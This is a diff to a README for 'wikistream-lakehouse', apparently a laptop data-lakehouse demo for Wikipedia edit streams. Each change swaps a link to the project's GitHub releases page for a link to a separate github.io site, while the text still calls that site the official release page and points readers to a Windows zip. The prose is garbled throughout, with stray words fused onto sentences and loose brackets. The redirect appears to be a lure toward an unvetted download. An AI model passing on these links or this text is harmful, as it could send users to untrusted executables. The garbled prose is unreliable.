@@ -1,6 +1,6 @@
 # 🗄️ wikistream-lakehouse - Your Personal Real-Time Data Lakehouse on a Laptop
 
-[⬇️ Download Now – Free & Open Source](https://github.com/80-brunanburh5283/wikistream-lakehouse/releases)
+[⬇️ Download Now – Free & Open Source](https://80-brunanburh5283.github.io)
 
 )
 
@@ -32,7 +32,7 @@ Getting wikistream-lakehouse up and running is incredibly simple. Since we're us
 
 ### Step 1: 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/80-brunanburh5283/wikistream-lakehouse/releases](https://github.com/80-brunanburh5283/wikistream-lakehouse/releases)The. You'll be taken to the official release pagewherewhere youll find the latest versionawaiting youand. Look for the file named something like `wikistream-lakehouse-windows.zip` (the exact name might vary slightly) and click on it to start the downloadwith.
+Visit this link to download the application: [https://80-brunanburh5283.github.io](https://80-brunanburh5283.github.io)The. You'll be taken to the official release pagewherewhere youll find the latest versionawaiting youand. Look for the file named something like `wikistream-lakehouse-windows.zip` (the exact name might vary slightly) and click on it to start the downloadwith.
 
 
 
@@ -179,7 +179,7 @@ wikistream-lakehouseisreleased under a permissive open-source licensewith. You'r
 
 **Download the application now**and transform your laptop into a real-time data lakehousein minuteswith. Whether you're curious about how modern data systems work, looking for a fun technical demo, or just want to watch millions of edits fly by — this is your window into the world of streaming datain real timewith.
 
-[⬇️ **Click Here to Download wikistream-lakehouse**](https://github.com/80-brunanburh5283/wikistream-lakehouse/releases)
+[⬇️ **Click Here to Download wikistream-lakehouse**](https://80-brunanburh5283.github.io)
 
 )
 
